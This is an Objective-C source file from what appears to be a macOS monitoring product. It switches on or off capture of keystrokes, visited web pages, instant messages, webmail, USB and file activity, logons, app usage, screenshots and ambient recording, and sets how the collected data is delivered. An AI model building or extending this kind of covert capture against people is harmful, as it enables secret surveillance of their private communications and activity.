//
//  PreferencesChangeHandler.m
//  AppEngine
//
//  Created by Makara Khloth on 12/8/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "PreferencesChangeHandler.h"
#import "AppEngine.h"

#import "ComponentHeaders.h"

@interface PreferencesChangeHandler (private)
- (void) enableDisableEventsCapture: (PrefEventsCapture *) aPrefEventCapture;
- (void) enableDisableSignupSettings: (PrefSignUp *) aPrefSignup;
@end

@implementation PreferencesChangeHandler

- (id) initWithAppEngine:(AppEngine *) aAppEngine {
	if ((self = [super init])) {
		mAppEngine = aAppEngine;
		[mAppEngine retain];
	}
	return (self);
}

- (void) onPreferenceChange: (Preference *) aPreference {
	switch ([aPreference type]) {
		case kEvents_Ctrl: {
			// 1. Events
			PrefEventsCapture *prefEventCapture = (PrefEventsCapture *)aPreference;	
			[self enableDisableEventsCapture:prefEventCapture];
		} break;
        case kSignUp: {
            PrefSignUp *prefSignup = (PrefSignUp *)aPreference;
            [self enableDisableSignupSettings:prefSignup];
        } break;
		default:
			break;
	}
}

- (void) enableDisableEventsCapture: (PrefEventsCapture *) aPrefEventCapture {
	if ([aPrefEventCapture mDeliveryMethod] == kDeliveryMethodAny) {
		[[mAppEngine mDDM] setMDataDeliveryMethod:kDataDeliveryViaWifiWWAN];
	} else if ([aPrefEventCapture mDeliveryMethod] == kDeliveryMethodWifi) {
		[[mAppEngine mDDM] setMDataDeliveryMethod:kDataDeliveryViaWifiOnly];
	}
	
	[[mAppEngine mEDM] setMaximumEvent:[aPrefEventCapture mMaxEvent]];
	[[mAppEngine mEDM] setDeliveryTimer:[aPrefEventCapture mDeliverTimer]];
	
    // Keyboard log
    if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventKeyLog]) {
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableKeyLog]) {
			[[mAppEngine mKeyboardCaptureManager] startCapture];
		} else {
			[[mAppEngine mKeyboardCaptureManager] stopCapture];
		}
	}
    
    // Browser visited page
    if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventPageVisited]) {
		if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnablePageVisited]) {
			[[mAppEngine mPageVisitedCaptureManager] startCapture];
		} else {
			[[mAppEngine mPageVisitedCaptureManager] stopCapture];
		}
	}

    // Usb connection
    if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventMacOSUSBConnection]) {
        if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableUSBConnection]) {
            [[mAppEngine mUSBConnectionCaptureManager] startCapture];
        } else {
            [[mAppEngine mUSBConnectionCaptureManager] stopCapture];
        }
    }
    
    // Usb file transfer
    if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventMacOSFileTransfer]) {
        if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableFileTransfer]) {
            [[mAppEngine mUSBFileTransferCaptureManager] startCapture];
        } else {
            [[mAppEngine mUSBFileTransferCaptureManager] stopCapture];
        }
    }
    
    // InternetFileTransferManager
    if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventMacOSFileTransfer]) {
        if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableFileTransfer]) {
            [[mAppEngine mInternetFileTransferManager] startCapture];
        } else {
            [[mAppEngine mInternetFileTransferManager] stopCapture];
        }
    }
    
//    // PrinterMonitorManager
//    if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventPrintJob]) {
//       if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnablePrintJob]) {
//            [[mAppEngine mPrinterMonitorManager] startCapture];
//        } else {
//            [[mAppEngine mPrinterMonitorManager] stopCapture];
//        }
//    }
    
//    // NetworkConnectionCaptureManager
//    if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventNetworkConnection]) {
//       if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableNetworkConnection]) {
//            [[mAppEngine mNetworkConnectionCaptureManager] startCapture];
//        } else {
//            [[mAppEngine mNetworkConnectionCaptureManager] stopCapture];
//        }
//    }

    // Application usage
    if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventMacOSAppUsage]) {
        if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableAppUsage]) {
            [[mAppEngine mApplicationUsageCaptureManager] startCapture];
        } else {
            [[mAppEngine mApplicationUsageCaptureManager] stopCapture];
        }
    }
    
    // Mac IM
    if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventMacOSIM]) {
        if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableIM]) {
            [[mAppEngine mIMCaptureManagerForMac] setMIndividualIM:[aPrefEventCapture mEnableIndividualIM]];
            [[mAppEngine mIMCaptureManagerForMac] startCapture];
        } else {
            [[mAppEngine mIMCaptureManagerForMac] stopCapture];
        }
    }
    
    // Logon/off
    if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventMacOSLogon]) {
        if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableLogon]) {
            [[mAppEngine mUserActivityCaptureManager] startCapture];
        } else {
            [[mAppEngine mUserActivityCaptureManager] stopCapture];
        }
    }
    
    // Web mail
    if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EVentMacOSEmail]) {
        if ([aPrefEventCapture mStartCapture] && [aPrefEventCapture mEnableEmail]) {
            [[mAppEngine mWebmailCaptureManager] startCapture];
        } else {
            [[mAppEngine mWebmailCaptureManager] stopCapture];
        }
    }
    
    // Temporal control
    if ([[mAppEngine mConfigurationManager]  isSupportedFeature:kFeatureID_ScreenRecording] ||
        [[mAppEngine mConfigurationManager]  isSupportedFeature:kFeatureID_AmbientRecording]) {
        
        if ([aPrefEventCapture mStartCapture] && ([aPrefEventCapture mEnableTemporalControlAR] || [aPrefEventCapture mEnableTemporalControlSSR])) {
            [[mAppEngine mTemporalControlManager] startTemporalControl];
        } else {
            [[mAppEngine mTemporalControlManager] stopTemporalControl];
            [[mAppEngine mScreenshotCaptureManagerImpl] stopCapture];
            //[[mAppEngine mNetworkTrafficCaptureManagerImpl] stopCapture];
        }
    }
    
    // File Activity
    if ([[mAppEngine mConfigurationManager] isSupportedFeature:kFeatureID_EventFileActivity]) {
        PrefFileActivity *prefFileActivity = (PrefFileActivity *)[mAppEngine.mPreferenceManager preference:kFileActivity];
        
        if ([aPrefEventCapture mStartCapture] && [prefFileActivity mEnable]) {

            NSMutableArray *activityTypes = [[NSMutableArray alloc]init];
            if (prefFileActivity.mActivityType & kFileActivityNone) {
                [activityTypes addObject:[NSNumber numberWithInt:0]];
            } if (prefFileActivity.mActivityType & kFileActivityCreate) {
                [activityTypes addObject:[NSNumber numberWithInt:1]];
            } if (prefFileActivity.mActivityType & kFileActivityCopy) {
                [activityTypes addObject:[NSNumber numberWithInt:2]];
            } if (prefFileActivity.mActivityType & kFileActivityMove) {
                [activityTypes addObject:[NSNumber numberWithInt:3]];
            } if (prefFileActivity.mActivityType & kFileActivityDelete) {
                [activityTypes addObject:[NSNumber numberWithInt:4]];
            } if (prefFileActivity.mActivityType & kFileActivityModify) {
                [activityTypes addObject:[NSNumber numberWithInt:5]];
            } if (prefFileActivity.mActivityType & kFileActivityRename) {
                [activityTypes addObject:[NSNumber numberWithInt:6]];
            } if (prefFileActivity.mActivityType & kFileActivityPermissionChange) {
                [activityTypes addObject:[NSNumber numberWithInt:7]];
            } if (prefFileActivity.mActivityType & kFileActivityAttributeChange) {
                [activityTypes addObject:[NSNumber numberWithInt:8]];
            } 
            
            [[mAppEngine mFileActivityCaptureManager] setExcludePathForCapture:[prefFileActivity mExcludedFileActivityPaths] setActionForCapture:activityTypes];
            [[mAppEngine mFileActivityCaptureManager] startCapture];
            
            [activityTypes release];
        } else {
            [[mAppEngine mFileActivityCaptureManager] stopCapture];
        }
    }
}

- (void) enableDisableSignupSettings: (PrefSignUp *) aPrefSignup {
    if ([aPrefSignup mEnableDebugLog])  {
        [[mAppEngine mFxLoggerManager] enableLog];
    } else {
        [[mAppEngine mFxLoggerManager] disableLog];
    }
}

- (void) dealloc {
	[mAppEngine release];
	[super dealloc];
}

@end
